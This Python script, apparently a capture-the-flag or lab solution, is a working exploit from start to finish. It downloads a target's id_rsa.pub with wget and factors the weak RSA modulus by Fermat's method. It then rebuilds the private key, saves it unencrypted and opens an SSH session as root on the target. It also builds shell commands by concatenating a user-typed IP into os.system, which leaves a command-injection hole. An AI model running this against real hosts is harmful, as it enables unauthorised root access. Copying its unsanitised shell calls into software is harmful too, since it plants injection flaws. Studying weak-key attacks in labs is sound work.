#!/usr/bin/python3

# gmpy2 is a C-coded Python extension module that supports
# multiple-precision arithmetic.
#
# pip install gmpy2
from gmpy2 import isqrt

from math import lcm

from cryptography.hazmat.primitives import serialization

from cryptography.hazmat.primitives.asymmetric import rsa

import os

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will
    # always be 2
    if (n & 1) == 0:
        return (n/2, 2)

    # isqrt returns the integer square root of n
    a = isqrt(n)

    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break
    print(f"p = {a+b}\n")
    print(f"q = {a-b}\n")
    print(f"Diff = {(a+b)-(a-b)}\n")
    return a + b, a - b

def generate_private_key(p, q, e):
    # Calculate modulus (n)
    modulus = p * q

    # Calculate private exponent (d)
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)

    # Construct RSA private key
    private_key = rsa.RSAPrivateNumbers(
        p=p,
        q=q,
        d=d,
        dmp1=d % (p - 1),
        dmq1=d % (q - 1),
        iqmp=pow(q, -1, p),
        public_numbers=rsa.RSAPublicNumbers(e=e, n=modulus)
    ).private_key()
    
    return private_key

def get_modulus_from_pub_key(pub_key_file):
    with open(pub_key_file, "rb") as f:
        public_key = serialization.load_ssh_public_key(
            f.read(), backend=None
        )
        modulus = public_key.public_numbers().n
        return modulus


if __name__ == "__main__":
    # Obtain IP for download id_rsa.pub
    ip = input("Enter IP >> ")
    download = "wget http://" + ip + "/development/id_rsa.pub" 
    os.system(download)
    # Sterilize Modulus
    pub_key_file = "id_rsa.pub"
    private_key_file = "id_rsa"  # Update with the path to your id_rsa private key file
    modulus = get_modulus_from_pub_key(pub_key_file)
    print(f"Length of the discovered RSA key : {modulus.bit_length()}")
    print("Modulus:", modulus)
    # Calcul p,q
    p_q = (factorize(modulus))
    p = int(p_q[0])
    q = int(p_q[1])
    e = 65537
    # Generate priv key
    private_key = generate_private_key(p, q, e)

    # Serialize private key to PEM format
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Save private key to a file
    with open("private_key.pem", "wb") as f:
        f.write(pem)

    print("Private key generated and saved to private_key.pem")
    print("--------------------------------------------------")
    print("Connecting >>>>>>")
    ssh = "chmod 600 private_key.pem && ssh -i private_key.pem root@" + ip
    os.system(ssh)
